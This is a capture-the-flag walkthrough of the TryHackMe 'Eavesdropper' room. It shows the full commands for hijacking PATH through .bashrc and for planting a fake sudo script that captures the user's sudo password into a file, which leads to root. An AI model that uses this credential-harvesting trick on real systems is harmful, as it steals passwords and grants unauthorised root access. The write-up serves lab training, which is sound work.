![image](https://user-images.githubusercontent.com/87700008/218304020-2bdb82e4-b27a-4656-9432-10e166b327dc.png)

https://tryhackme.com/room/eavesdropper

Difficulty : Medium

## Enumeration :

This room provides the ssh keys for "frank" to get initial access. So, I downloaded the key and modified it to 'chmod 600' and logged in as "frank".

![image](https://user-images.githubusercontent.com/87700008/218304164-75bbf3fd-e3db-478b-ab38-70aa741df0c2.png)

I started by checking the running processes and found that very few processes were running and also "frank" has sudo access as well:

![image](https://user-images.githubusercontent.com/87700008/218304209-63bf14e9-d4f1-4d3e-8886-0821586e11b6.png)

![image](https://user-images.githubusercontent.com/87700008/218304334-2b6bdb48-8c18-4a1c-9ada-3ce35bb4bc73.png)

I assumed that this might be a docker environment. To confirm, I ran the 'ls -la' command to list all the files in the root directory and found a file called ".dockerenv" which confirmed my environment as a docker.

![image](https://user-images.githubusercontent.com/87700008/218304361-a25b0610-ad8c-4d7c-ab31-a15dbacc1a8c.png)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Priv Esc :

Moving ahead, I checked with LinPeas for the privilege escalation vector but didn't find anything. After that, I checked for the running processes using 'pspy'.

![image](https://user-images.githubusercontent.com/87700008/218307727-4dee4f8f-aa95-480f-9229-f769b4acf0ae.png)

I observed that someone else was also using the 'frank' account and using it to check the shadow file, happening every ~30 seconds. So it's a scheduled process, and if we can abuse this scheduled job, we can have the root password.

As the other user also has the same access as 'frank', we can exploit the 'PATH' and place a false 'sudo' file to be executed.

    frank@workstation:~$ mkdir ./bin
    frank@workstation:~$ touch ./bin/sudo
    frank@workstation:~$ chmod +x ./bin/sudo

Since 'frank'sudo access requires the sudo password, we can use the following script and put it into our own created sudo file. The script will take the sudo password and store it in a file:

    #!/bin/bash
    
    echo "Enter password: "
    read -s password
    
    echo $password >> /home/frank/password.txt

After this, we need to redirect the PATH of 'frank', which can be done by adding the following line in the .bashrc file:
    
    export PATH=/home/frank/bin:$PATH
    
![image](https://user-images.githubusercontent.com/87700008/218309588-79a2527d-c8a0-4f9f-b0c0-1b615ec11b32.png)

After doing this, we just have to wait for some time and then we can get the password from the 'password.txt' file.

![image](https://user-images.githubusercontent.com/87700008/218309626-c67496f1-693b-4274-b9d3-9ca3dedeb652.png)

Using the gathered password, I switched the user to sudo.

![image](https://user-images.githubusercontent.com/87700008/218309758-ebc89ff6-c216-4175-9fa4-30a62169ec8b.png)

After switching to sudo, I got the flag in the root home directory. (pwn3d!🙂)

![image](https://user-images.githubusercontent.com/87700008/218309807-6e38dc3c-97b5-4680-97fa-999f75fb1d99.png)
